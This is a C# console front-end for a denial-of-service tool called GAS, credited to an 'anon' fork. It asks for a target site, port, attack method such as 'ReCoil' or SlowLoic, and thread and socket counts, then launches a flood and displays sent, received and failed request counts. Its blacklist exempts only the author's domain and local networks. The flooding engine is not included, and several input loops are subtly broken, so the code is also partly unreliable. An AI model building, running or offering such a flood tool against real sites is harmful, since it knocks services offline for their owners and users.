using System;
using System.Collections.Generic;
using System.Timers;
using System.Text.RegularExpressions;

namespace GAS.TUI
{
    class Program
    {
        static DateTime d;
        static string[] Blacklist = new string[] { "epicm.org", "localhost", "127.0.0", "192.168." };
        static GAS.Core.Manager Core = new GAS.Core.Manager();
        static int num = 1;
        public static void Main(string[] args) {
            int tmp_int_parse = 0;
            bool tmp_bool_parse = false;
            try { Console.Title = "[GAS] for urkaine :)"; }
            catch { }
            #region Detect oS
            string temp;
            if ( Environment.OSVersion.Platform.ToString().ToLower().Contains("unix") )
                if ( Environment.UserName != "root" )
                    Console.Error.WriteLine("You are using Linux/Mac OS and you are not root.\r\nIf you want to use ReCoil/SlowLoic attack you must run \"ulimit -n<ShreadCount>*<SocketCount>*2+5000\"");
                else {
                    Console.WriteLine("Is file open limit unlocked?\r\nIf attack will not give any effect run \"ulimit -n<ShreadCount>*<SocketCount>*2+5000\" as root");
                    Console.WriteLine("Do you want to run \"ulimit -n999999\"? [true] (true|false)");
                    if ( bool.Parse(( temp = Console.ReadLine() ) == "" ? "true" : temp) ) {
                        try {
                            System.Diagnostics.Process.Start("ulimit", "-n999999");
                        }
                        catch { }
                    }

                }
            #endregion
            #region Info
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("###############################################" +
                              Environment.NewLine +
                              "#                                             #" +
                              Environment.NewLine +
                              "#  GAS 4 anon by http://github.com/kasthack   #" +
                              Environment.NewLine +
                              "#                         fork by STAM  1.0   #" +
                              Environment.NewLine +
                              "###############################################");
            #endregion
            while ( !GetHost() ) ;
            #region GetParam
            if ( _q(String.Format("Subsite is {0}, do you want to change it? [n] (y/n)", Core.Subsite)).Trim().ToLower() == "y" )
                Core.Subsite = Console.ReadLine();
            while ( !int.TryParse(( temp = _q("Enter port[80]:") ) == "" ? "80" : temp, out tmp_int_parse) )
                _e("Bad port");
            Core.Port = tmp_int_parse;
            var mt = typeof(GAS.Core.AttackMethod);
            Core.Method = (GAS.Core.AttackMethod)Enum.Parse(mt, ( temp = _q(String.Format("Select attack type [ReCoil]:\r\n({0})", String.Join("|", Enum.GetNames(mt)))) ) == "" ? "ReCoil" : temp);
            while ( !int.TryParse(( temp = _q("Enter thread count [50]:") ) == "" ? "50" : temp, out tmp_int_parse) )
                Core.Threads = tmp_int_parse;
            while ( !int.TryParse(( temp = _q("Enter sockets per thread [50]") ) == "" ? "50" : temp, out tmp_int_parse) )
                Core.SPT = tmp_int_parse;
            while ( !int.TryParse(( temp = _q("Enter delay [0]:") ) == "" ? "0" : temp, out tmp_int_parse) )
                Core.Delay = tmp_int_parse;
            while ( !int.TryParse(( temp = _q("Enter timeout[30]:") ) == "" ? "30" : temp, out tmp_int_parse) )
                Core.Timeout = tmp_int_parse;
            while ( !bool.TryParse(( temp = _q("USE Get [true]:") ) == "" ? "true" : temp, out tmp_bool_parse) )
                Core.USEGet = tmp_bool_parse;
            while ( !bool.TryParse(( temp = _q("USE GZIP [true]:") ) == "" ? "true" : temp, out tmp_bool_parse) )
                Core.UseGZIP = tmp_bool_parse;
            while ( !bool.TryParse(( temp = _q("Wait For Response [false]:") ) == "" ? "false" : temp, out tmp_bool_parse) )
                Core.WaitForResponse = tmp_bool_parse;
            while ( !bool.TryParse(( temp = _q("Append RANDOM Chars [true]:") ) == "" ? "true" : temp, out tmp_bool_parse) )
                Core.AppendRANDOMChars = tmp_bool_parse;
            while ( !bool.TryParse(( temp = _q("Append RANDOM Chars 2 Url [true]:") ) == "" ? "true" : temp, out tmp_bool_parse) )
                Core.AppendRANDOMCharsUrl = tmp_bool_parse;
            Console.WriteLine("Starting attack...");
            #endregion
            #region Start and stop
            Core.Start();
            d = DateTime.Now;
            Console.Clear();
            Timer t = new System.Timers.Timer();
            t.Interval = 500;
            t.Elapsed += new ElapsedEventHandler(t_Elapsed);
            t.Start();
            //attack started
            #region Cool UI
            Console.SetCursorPosition(0, 0);
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("------------------------------------------------");
            Console.ForegroundColor = ConsoleColor.Green;
            try {
                Console.SetCursorPosition(0, 6);
            }
            catch { }
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("------------------------------------------------");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("Attacking...");
            Console.ForegroundColor = ConsoleColor.Yellow;

            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("Press Enter stop attack and exit");
            Console.ForegroundColor = ConsoleColor.Green;
            #endregion
            Console.ReadLine();
            Console.WriteLine("\r\n\r\n\r\n\r\n------------------------------------------------\r\nExiting, please wait...");
            t.Stop();
            Core.Stop();
            Console.Clear();
            #endregion
        }
        static string _q(string q) {
            var con_c = Console.ForegroundColor;
            Console.ForegroundColor = ConsoleColor.Yellow;
            string s = "";
            Console.Write("{0}. {1}{2}>", num++, q, Environment.NewLine);
            Console.ForegroundColor = con_c;
            s = Console.ReadLine();
            return s;
        }
        static void _e(string e) {
            var con_c = Console.ForegroundColor;
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(e);
            Console.ForegroundColor = con_c;
        }
        static bool GetHost() {
            string temp = _q("Select target [www.example.com]:");
            temp = ( temp == "" ? "www.example.com" : temp );
            foreach ( string s in Blacklist )
                if ( temp.ToLower().Contains(s) ) {
                    _e("[Restricted domain!]");
                    return false;
                }
            bool IPOK = Core.LockOn(temp);
            if ( !IPOK )
                _e("[Wrong Target!]");
            return IPOK;
        }
        static void t_Elapsed(object sender, ElapsedEventArgs argZ) {
            int x = Console.CursorLeft, y = Console.CursorTop, w = Console.WindowWidth;
            char[] e = new char[w];
            string s;
            int ind = 0;
            for ( int i = 0; i < w; e[i++] = ' ' ) ;
            try {
                Console.SetCursorPosition(0, 3);
            }
            catch { }
            Console.WriteLine(e);
            Console.WriteLine(e);
            try {
                Console.SetCursorPosition(0, 3);
            }
            catch { }
            Console.WriteLine("Time elapsed\tSent\tReceived\tFailed");
            s = DateTime.Now.Subtract(d).ToString();
            s = s.Substring(0, ( ind = s.LastIndexOfAny(new char[] { '.', ',' }) ) > 0 ? ind : s.Length);
            Console.WriteLine("{0}\t{1}\t{2}\t\t{3}", s, Core.Requested, Core.Downloaded, Core.Failed);
        }
    }
}